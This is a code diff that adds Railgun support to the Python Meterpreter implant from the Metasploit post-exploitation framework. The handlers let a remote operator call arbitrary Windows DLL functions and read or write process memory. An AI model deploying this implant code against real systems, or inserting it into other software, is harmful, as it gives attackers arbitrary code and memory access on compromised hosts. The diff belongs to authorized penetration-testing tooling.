@@ -72,6 +72,7 @@ if has_ctypes:
 	#
 	# Windows Structures
 	#
+	size_t = getattr(ctypes, 'c_uint' + str(ctypes.sizeof(ctypes.c_void_p) * 8))
 	class SOCKADDR(ctypes.Structure):
 		_fields_ = [("sa_family", ctypes.c_ushort),
 			("sa_data", (ctypes.c_uint8 * 14))]
@@ -262,6 +263,7 @@ if has_ctypes:
 		_fields_ = [("len", ctypes.c_uint16),
 			("type", ctypes.c_uint16)]
 
+TLV_EXTENSIONS           = 20000
 #
 # TLV Meta Types
 #
@@ -362,6 +364,27 @@ TLV_TYPE_LOCAL_PORT            = TLV_META_TYPE_UINT    | 1503
 TLV_TYPE_CONNECT_RETRIES       = TLV_META_TYPE_UINT    | 1504
 
 TLV_TYPE_SHUTDOWN_HOW          = TLV_META_TYPE_UINT    | 1530
+
+##
+# Railgun
+##
+TLV_TYPE_EXTENSION_RAILGUN             = 0
+TLV_TYPE_RAILGUN_SIZE_OUT              = TLV_META_TYPE_UINT   | (TLV_TYPE_EXTENSION_RAILGUN + TLV_EXTENSIONS + 1)
+TLV_TYPE_RAILGUN_STACKBLOB             = TLV_META_TYPE_RAW    | (TLV_TYPE_EXTENSION_RAILGUN + TLV_EXTENSIONS + 2)
+TLV_TYPE_RAILGUN_BUFFERBLOB_IN         = TLV_META_TYPE_RAW    | (TLV_TYPE_EXTENSION_RAILGUN + TLV_EXTENSIONS + 3)
+TLV_TYPE_RAILGUN_BUFFERBLOB_INOUT      = TLV_META_TYPE_RAW    | (TLV_TYPE_EXTENSION_RAILGUN + TLV_EXTENSIONS + 4)
+TLV_TYPE_RAILGUN_BACK_BUFFERBLOB_OUT   = TLV_META_TYPE_RAW    | (TLV_TYPE_EXTENSION_RAILGUN + TLV_EXTENSIONS + 5)
+TLV_TYPE_RAILGUN_BACK_BUFFERBLOB_INOUT = TLV_META_TYPE_RAW    | (TLV_TYPE_EXTENSION_RAILGUN + TLV_EXTENSIONS + 6)
+TLV_TYPE_RAILGUN_BACK_RET              = TLV_META_TYPE_QWORD  | (TLV_TYPE_EXTENSION_RAILGUN + TLV_EXTENSIONS + 7)
+TLV_TYPE_RAILGUN_BACK_ERR              = TLV_META_TYPE_UINT   | (TLV_TYPE_EXTENSION_RAILGUN + TLV_EXTENSIONS + 8)
+TLV_TYPE_RAILGUN_DLLNAME               = TLV_META_TYPE_STRING | (TLV_TYPE_EXTENSION_RAILGUN + TLV_EXTENSIONS + 9)
+TLV_TYPE_RAILGUN_FUNCNAME              = TLV_META_TYPE_STRING | (TLV_TYPE_EXTENSION_RAILGUN + TLV_EXTENSIONS + 10)
+TLV_TYPE_RAILGUN_MULTI_GROUP           = TLV_META_TYPE_GROUP  | (TLV_TYPE_EXTENSION_RAILGUN + TLV_EXTENSIONS + 11)
+TLV_TYPE_RAILGUN_MEM_ADDRESS           = TLV_META_TYPE_QWORD  | (TLV_TYPE_EXTENSION_RAILGUN + TLV_EXTENSIONS + 12)
+TLV_TYPE_RAILGUN_MEM_DATA              = TLV_META_TYPE_RAW    | (TLV_TYPE_EXTENSION_RAILGUN + TLV_EXTENSIONS + 13)
+TLV_TYPE_RAILGUN_MEM_LENGTH            = TLV_META_TYPE_UINT   | (TLV_TYPE_EXTENSION_RAILGUN + TLV_EXTENSIONS + 14)
+TLV_TYPE_RAILGUN_CALLCONV              = TLV_META_TYPE_STRING | (TLV_TYPE_EXTENSION_RAILGUN + TLV_EXTENSIONS + 15)
+TLV_TYPE_RAILGUN_BACK_MSG              = TLV_META_TYPE_STRING | (TLV_TYPE_EXTENSION_RAILGUN + TLV_EXTENSIONS + 16)
 
 ##
 # Registry
@@ -528,6 +551,15 @@ IFA_ADDRESS    = 1
 IFA_LABEL      = 3
 
 meterpreter.register_extension('stdapi')
+
+def bytes_to_ctarray(bytes_):
+	ctarray = (ctypes.c_byte * len(bytes_))()
+	ctypes.memmove(ctypes.byref(ctarray), bytes_, len(bytes_))
+	return ctarray
+
+def ctarray_to_bytes(ctarray):
+	bytes_ = buffer(ctarray) if sys.version_info[0] < 3 else bytes(ctarray)
+	return bytes_[:]
 
 def calculate_32bit_netmask(bits):
 	if bits == 32:
@@ -1458,6 +1490,148 @@ def stdapi_net_socket_tcp_shutdown(request, response):
 	how = packet_get_tlv(request, TLV_TYPE_SHUTDOWN_HOW).get('value', socket.SHUT_RDWR)
 	channel = meterpreter.channels[channel_id]
 	channel.shutdown(how)
+	return ERROR_SUCCESS, response
+
+def _win_format_message(source, msg_id):
+	EN_US = 0
+	msg_flags = 0
+	msg_flags |= 0x00000100  # FORMAT_MESSAGE_ALLOCATE_BUFFER
+	msg_flags |= 0x00000200  # FORMAT_MESSAGE_IGNORE_INSERTS
+	msg_flags |= 0x00000800  # FORMAT_MESSAGE_FROM_HMODULE
+	msg_flags |= 0x00001000  # FORMAT_MESSAGE_FROM_SYSTEM
+	FormatMessage = ctypes.windll.kernel32.FormatMessageA
+	FormatMessage.argtypes = [ctypes.c_uint32, ctypes.c_void_p, ctypes.c_uint32, ctypes.c_uint32, ctypes.c_void_p, ctypes.c_uint32, ctypes.c_void_p]
+	FormatMessage.restype = ctypes.c_uint32
+	LocalFree = ctypes.windll.kernel32.LocalFree
+	LocalFree.argtypes = [ctypes.c_void_p]
+
+	buff = ctypes.c_char_p()
+	if not FormatMessage(msg_flags, source, msg_id, EN_US, ctypes.byref(buff), 0, None):
+		return None
+	message = buff.value.decode('utf-8').rstrip()
+	LocalFree(buff)
+	return message
+
+def _win_memread(address, size, handle=-1):
+	ReadProcessMemory = ctypes.windll.kernel32.ReadProcessMemory
+	ReadProcessMemory.argtypes = [ctypes.c_void_p, ctypes.c_void_p, ctypes.c_void_p, size_t, ctypes.POINTER(size_t)]
+	buff = (ctypes.c_byte * size)()
+	read = size_t()
+	result = ReadProcessMemory(handle, address, ctypes.byref(buff), size, ctypes.byref(read))
+	if not result:
+		return None
+	return ctarray_to_bytes(buff)
+
+def _win_memwrite(address, data, handle=-1):
+	WriteProcessMemory = ctypes.windll.kernel32.WriteProcessMemory
+	WriteProcessMemory.argtypes = [ctypes.c_void_p, ctypes.c_void_p, ctypes.c_void_p, size_t, ctypes.POINTER(size_t)]
+	size = len(data)
+	buff = bytes_to_ctarray(data)
+	written = size_t()
+	result = WriteProcessMemory(handle, address, ctypes.byref(buff), size, ctypes.byref(written))
+	if not result:
+		return None
+	return written.value
+
+@meterpreter.register_function_windll
+def stdapi_railgun_api(request, response):
+	size_out = packet_get_tlv(request, TLV_TYPE_RAILGUN_SIZE_OUT)['value']
+	stack_blob = packet_get_tlv(request, TLV_TYPE_RAILGUN_STACKBLOB)['value']
+	buff_blob_in = packet_get_tlv(request, TLV_TYPE_RAILGUN_BUFFERBLOB_IN)['value']
+	buff_blob_inout = packet_get_tlv(request, TLV_TYPE_RAILGUN_BUFFERBLOB_INOUT)['value']
+	dll_name = packet_get_tlv(request, TLV_TYPE_RAILGUN_DLLNAME)['value']
+	func_name = packet_get_tlv(request, TLV_TYPE_RAILGUN_FUNCNAME)['value']
+	call_conv = packet_get_tlv(request, TLV_TYPE_RAILGUN_CALLCONV).get('value', ('stdcall' if has_windll else 'cdecl'))
+
+	buff_blob_in = bytes_to_ctarray(buff_blob_in)
+	buff_blob_out = (ctypes.c_byte * size_out)()
+	buff_blob_inout = bytes_to_ctarray(buff_blob_inout)
+
+	if ctypes.sizeof(ctypes.c_void_p) == 4:
+		native = ctypes.c_uint32
+		fmt = 'II'
+	elif ctypes.sizeof(ctypes.c_void_p) == 8:
+		native = ctypes.c_uint64
+		fmt = 'QQ'
+	else:
+		raise RuntimeError('unknown sizeof(void *)')
+
+	if call_conv.lower() == 'cdecl':
+		func_type = ctypes.CFUNCTYPE
+	elif call_conv.lower() == 'stdcall':
+		func_type = ctypes.WINFUNCTYPE
+	else:
+		raise ValueError('unknown calling convention')
+
+	call_args = []
+	func_args = []
+	for pos in range(0, len(stack_blob), struct.calcsize(fmt)):
+		arg_type, arg = struct.unpack(fmt, stack_blob[pos:pos + struct.calcsize(fmt)])
+		if arg_type == 0:    # literal
+			call_args.append(arg)
+			func_args.append(native)
+		elif arg_type == 1:  # relative to in
+			call_args.append(ctypes.byref(buff_blob_in, arg))
+			func_args.append(ctypes.c_void_p)
+		elif arg_type == 2:  # relative to out
+			call_args.append(ctypes.byref(buff_blob_out, arg))
+			func_args.append(ctypes.c_void_p)
+		elif arg_type == 3:  # relative to inout
+			call_args.append(ctypes.byref(buff_blob_inout, arg))
+			func_args.append(ctypes.c_void_p)
+		else:
+			raise ValueError('unknown argument type: ' + str(arg_type))
+
+	debug_print('[*] railgun calling: ' + dll_name + '.' + func_name)
+	GetModuleHandle = ctypes.windll.kernel32.GetModuleHandleA
+	GetModuleHandle.argtypes = [ctypes.c_char_p]
+	GetModuleHandle.restype = ctypes.c_void_p
+	dll_handle = GetModuleHandle(bytes(dll_name, 'UTF-8'))
+
+	prototype = func_type(native, *func_args)
+	func = prototype((func_name, ctypes.WinDLL(dll_name)))
+	result = func(*call_args)
+
+	last_error = ctypes.windll.kernel32.GetLastError()
+	error_message = _win_format_message(dll_handle, last_error)
+	if error_message is None:
+		if last_error == ERROR_SUCCESS:
+			error_message = 'The operation completed successfully.'
+		else:
+			error_message = 'FormatMessage failed to retrieve the error.'
+
+	response += tlv_pack(TLV_TYPE_RAILGUN_BACK_ERR, last_error)
+	response += tlv_pack(TLV_TYPE_RAILGUN_BACK_MSG, error_message)
+	response += tlv_pack(TLV_TYPE_RAILGUN_BACK_RET, result)
+	response += tlv_pack(TLV_TYPE_RAILGUN_BACK_BUFFERBLOB_OUT, ctarray_to_bytes(buff_blob_out))
+	response += tlv_pack(TLV_TYPE_RAILGUN_BACK_BUFFERBLOB_INOUT, ctarray_to_bytes(buff_blob_inout))
+	return ERROR_SUCCESS, response
+
+@meterpreter.register_function_windll
+def stdapi_railgun_api_multi(request, response):
+	for group_tlv in packet_enum_tlvs(request, tlv_type=TLV_TYPE_RAILGUN_MULTI_GROUP):
+		group_result = stdapi_railgun_api(group_tlv['value'], bytes())[1]
+		response += tlv_pack(TLV_TYPE_RAILGUN_MULTI_GROUP, group_result)
+	return ERROR_SUCCESS, response
+
+@meterpreter.register_function_windll
+def stdapi_railgun_memread(request, response):
+	address = packet_get_tlv(request, TLV_TYPE_RAILGUN_MEM_ADDRESS)['value']
+	length = packet_get_tlv(request, TLV_TYPE_RAILGUN_MEM_LENGTH)['value']
+	result = _win_memread(address, length)
+	if result is None:
+		return error_result_windows(), response
+	response += tlv_pack(TLV_TYPE_RAILGUN_MEM_DATA, result)
+	return ERROR_SUCCESS, response
+
+@meterpreter.register_function_windll
+def stdapi_railgun_memwrite(request, response):
+	address = packet_get_tlv(request, TLV_TYPE_RAILGUN_MEM_ADDRESS)['value']
+	data = packet_get_tlv(request, TLV_TYPE_RAILGUN_MEM_DATA)['value']
+	length = packet_get_tlv(request, TLV_TYPE_RAILGUN_MEM_LENGTH)['value']
+	result = _win_memwrite(address, data)
+	if result is None:
+		return error_result_windows(), response
 	return ERROR_SUCCESS, response
 
 def _wreg_close_key(hkey):
